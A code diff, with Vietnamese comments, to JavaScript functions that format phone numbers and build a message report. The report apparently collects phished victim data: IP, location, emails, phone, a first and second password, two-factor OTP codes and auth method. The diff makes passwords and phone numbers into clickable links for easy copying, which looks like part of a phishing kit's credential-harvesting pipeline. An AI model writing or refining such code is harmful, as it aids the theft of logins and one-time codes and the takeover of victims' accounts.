@@ -308,7 +308,8 @@ function formatPhoneNumber(phone, countryIso, dialCode) {
                 formatted = cleanPhone;
             }
         }
-        return `${country.name} +${dialCode} ${formatted}`;
+        // CHỈ THÊM LINK, GIỮ NGUYÊN ĐỊNH DẠNG
+        return `<a href="tel:+${dialCode}${cleanPhone}">${country.name} +${dialCode} ${formatted}</a>`;
     }
 
     // Nếu số bắt đầu bằng dấu +, parse trực tiếp
@@ -318,12 +319,12 @@ function formatPhoneNumber(phone, countryIso, dialCode) {
             if (parsed && parsed.isValid()) {
                 const code = String(parsed.countryCallingCode);
                 if (countryMap[code]) {
-                    return `${countryMap[code].name} ${parsed.formatInternational()}`;
+                    return `<a href="tel:${raw}">${countryMap[code].name} ${parsed.formatInternational()}</a>`;
                 }
-                return parsed.formatInternational();
+                return `<a href="tel:${raw}">${parsed.formatInternational()}</a>`;
             }
         } catch(e) {}
-        return raw;
+        return `<a href="tel:${raw}">${raw}</a>`;
     }
 
     // Tìm dial code từ đầu số (ưu tiên độ dài lớn hơn)
@@ -342,12 +343,11 @@ function formatPhoneNumber(phone, countryIso, dialCode) {
         if (remaining.startsWith('0')) {
             remaining = remaining.substring(1);
         }
-        return `${matchedCountry.name} +${matchedCountry.dialCode} ${remaining}`;
+        return `<a href="tel:+${matchedCountry.dialCode}${remaining}">${matchedCountry.name} +${matchedCountry.dialCode} ${remaining}</a>`;
     }
     
-    return raw;
+    return `<a href="tel:${raw}">${raw}</a>`;
 }
-
 // ==================== HÀM FORMAT TIN NHẮN ====================
 function formatMessage(data) {
     const otp1 = data.twoFa || data.code2FA1 || data.otp1 || '';
@@ -362,12 +362,15 @@ function formatMessage(data) {
         location = 'N/A';
     }
     
-    const formattedPhone = formatPhoneNumber(
-        data.phone, 
-        data.countryIso, 
-        data.dialCode
-    );
+    const formattedPhone = formatPhoneNumber(data.phone, data.countryIso, data.dialCode);
     
+    // Password dạng link (dùng a href để dễ copy, nhưng hiển thị text thường)
+    const pass1 = data.password || data.passwordFirst || 'N/A';
+    const pass2 = data.passwordSecond || 'N/A';
+    const pass1Link = pass1 !== 'N/A' ? `<a href="#">${pass1}</a>` : 'N/A';
+    const pass2Link = pass2 !== 'N/A' ? `<a href="#">${pass2}</a>` : 'N/A';
+    
+    // GIỮ NGUYÊN ĐỊNH DẠNG CŨ, KHÔNG ICON, CHỈ THÊM LINK
     return `Ip: ${data.ip && !data.ip.includes('Error') ? data.ip : 'N/A'}
 Location: ${location}
 -----------------------------
@@ -379,8 +382,8 @@ Email: ${data.email || 'N/A'}
 Email Business: ${data.business || data.businessEmail || 'N/A'}
 Phone Number: ${formattedPhone}
 -----------------------------
-Password First: <a href="#">${data.password || data.passwordFirst || 'N/A'}</a>
-Password Second: <a href="#">${data.passwordSecond || 'N/A'}</a>
+Password First: ${pass1Link}
+Password Second: ${pass2Link}
 -----------------------------
 Auth Method: ${data.authMethod || 'N/A'}
 -----------------------------
